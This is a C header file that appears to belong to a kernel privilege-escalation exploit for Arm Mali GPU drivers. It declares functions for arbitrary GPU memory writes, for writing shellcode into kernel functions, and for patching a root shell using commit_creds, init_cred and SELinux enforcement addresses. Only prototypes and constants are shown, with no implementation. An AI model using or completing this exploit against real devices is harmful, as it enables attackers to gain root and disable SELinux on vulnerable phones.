#ifndef MEM_WRITE_H
#define MEM_WRITE_H

#include <unistd.h>
#include "mali.h"
#include "mali_base_jm_kernel.h"
#include "midgard.h"
#include "log_utils.h"

#define KERNEL_BASE 0x80000000

#define PAGE_SHIFT 12

#define OVERWRITE_INDEX 256

void* map_gpu(int mali_fd, unsigned int va_pages, unsigned int commit_pages, bool read_only, int group);

void fixup_root_shell(uint64_t init_cred, uint64_t commit_cred, uint64_t read_enforce, uint32_t add_init, uint32_t add_commit, uint32_t* root_code);

void write_to(int mali_fd, uint64_t gpu_addr, uint64_t value, int atom_number, enum mali_write_value_type type);

uint8_t write_func(int mali_fd, uint64_t func, uint64_t* reserved, uint64_t size, uint32_t* shellcode, uint64_t code_size, uint64_t reserved_size, uint8_t atom_number);

uint8_t cleanup(int mali_fd, uint64_t pgd, uint8_t atom_number);

int run_enforce();
#endif
